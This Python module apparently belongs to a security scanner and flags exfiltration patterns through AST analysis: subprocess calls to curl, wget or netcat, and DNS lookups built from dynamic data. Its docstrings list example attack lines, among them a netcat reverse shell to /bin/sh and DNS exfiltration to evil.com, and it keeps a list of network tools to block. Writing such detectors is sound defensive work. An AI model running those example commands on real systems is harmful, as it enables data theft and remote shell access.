"""AST detectors for data exfiltration patterns.

Detects:
- subprocess.run/call/check_output/check_call/Popen where the first positional
  arg is an ast.List containing string constants matching network tool names
  (curl, wget, nc, ncat, netcat) -- EXFIL-008.
  Note: 'nc' is ambiguous and only flagged when at least one network-related
  flag (-e, -l, -p, -c, -k, -u, -z) is present in the argument list.
- socket.getaddrinfo() with non-literal hostname (f-strings, variables,
  concatenation) indicating DNS exfiltration -- EXFIL-006

Pure functions: no I/O, no logging, no side effects.
"""

from __future__ import annotations

import ast

from skill_scan._ast_imports import get_call_name
from skill_scan.models import Finding, Severity

_SUBPROCESS_CALLS = frozenset(
    {
        "subprocess.run",
        "subprocess.call",
        "subprocess.check_output",
        "subprocess.check_call",
        "subprocess.Popen",
    }
)

_NETWORK_TOOLS = frozenset({"curl", "wget", "nc", "ncat", "netcat"})

# 'nc' is ambiguous (could be netcat or an unrelated tool).
# Require at least one network-related flag to reduce false positives.
_NC_NETWORK_FLAGS = frozenset({"-e", "-l", "-p", "-c", "-k", "-u", "-z"})

_CATEGORY = "data-exfiltration"
_RULE_ID = "EXFIL-008"
_RECOMMENDATION = "Remove subprocess calls to network tools; use auditable Python HTTP clients instead"


def _match_network_tool(first_value: str, rest: list[ast.expr]) -> str | None:
    """Return the tool name if it's a known network tool, else None.

    'nc' is ambiguous — requires at least one network-related flag in *rest*.
    """
    tool_name = first_value.split("/")[-1]  # handle /usr/bin/curl
    if tool_name not in _NETWORK_TOOLS:
        return None
    if tool_name == "nc" and not any(
        isinstance(e, ast.Constant) and isinstance(e.value, str) and e.value in _NC_NETWORK_FLAGS
        for e in rest
    ):
        return None
    return tool_name


def _detect_subprocess_list_exfil(
    node: ast.AST, file_path: str, *, alias_map: dict[str, str] | None = None
) -> list[Finding]:
    """Detect subprocess calls with list args containing network tools.

    Catches patterns like:
      subprocess.run(['curl', '-d', data, url])
      subprocess.check_output(['wget', url])
      sp.Popen(['nc', '-e', '/bin/sh', host])  (aliased import; 'nc' requires a network flag)

    Note: bare 'nc' without a recognised network flag (e.g. -e, -l, -p) is
    NOT flagged to avoid false positives on unrelated uses of nc.
    """
    if not isinstance(node, ast.Call):
        return []

    name = get_call_name(node, alias_map)
    if name not in _SUBPROCESS_CALLS:
        return []

    # Must have at least one positional arg that is a list
    if not node.args or not isinstance(node.args[0], ast.List):
        return []

    elements = node.args[0].elts
    if not elements:
        return []

    # First element must be a string constant matching a network tool
    first = elements[0]
    if not isinstance(first, ast.Constant) or not isinstance(first.value, str):
        return []

    tool_name = _match_network_tool(first.value, elements[1:])
    if tool_name is None:
        return []

    return [
        Finding(
            rule_id=_RULE_ID,
            severity=Severity.CRITICAL,
            category=_CATEGORY,
            file=file_path,
            line=node.lineno,
            matched_text=f"{name}(['{first.value}', ...])",
            description=f"Subprocess network tool invocation -- {name}() with '{tool_name}' detected via AST",
            recommendation=_RECOMMENDATION,
        )
    ]


# -- DNS exfil via getaddrinfo -----------------------------------------------

_DNS_EXFIL_TARGETS = frozenset({"socket.getaddrinfo"})

_DNS_RULE_ID = "EXFIL-006"
_DNS_RECOMMENDATION = (
    "Do not construct DNS hostnames from dynamic data; this pattern is commonly used for DNS exfiltration"
)


def _detect_dns_exfil(
    node: ast.AST, file_path: str, *, alias_map: dict[str, str] | None = None
) -> list[Finding]:
    """Detect socket.getaddrinfo() with non-literal first argument.

    Catches DNS exfiltration patterns like:
      socket.getaddrinfo(f'{data}.evil.com', 80)
      socket.getaddrinfo(hostname, 80)
      socket.getaddrinfo(data + '.evil.com', 80)
    """
    if not isinstance(node, ast.Call):
        return []

    name = get_call_name(node, alias_map)
    if name not in _DNS_EXFIL_TARGETS:
        return []

    # Must have at least one positional arg (the hostname)
    if not node.args:
        return []

    hostname_arg = node.args[0]

    # Literal string hostname is safe -- skip
    if isinstance(hostname_arg, ast.Constant) and isinstance(hostname_arg.value, str):
        return []

    return [
        Finding(
            rule_id=_DNS_RULE_ID,
            severity=Severity.CRITICAL,
            category=_CATEGORY,
            file=file_path,
            line=node.lineno,
            matched_text=f"{name}(<dynamic>, ...)",
            description=f"DNS exfiltration -- {name}() with dynamic hostname detected via AST",
            recommendation=_DNS_RECOMMENDATION,
        )
    ]
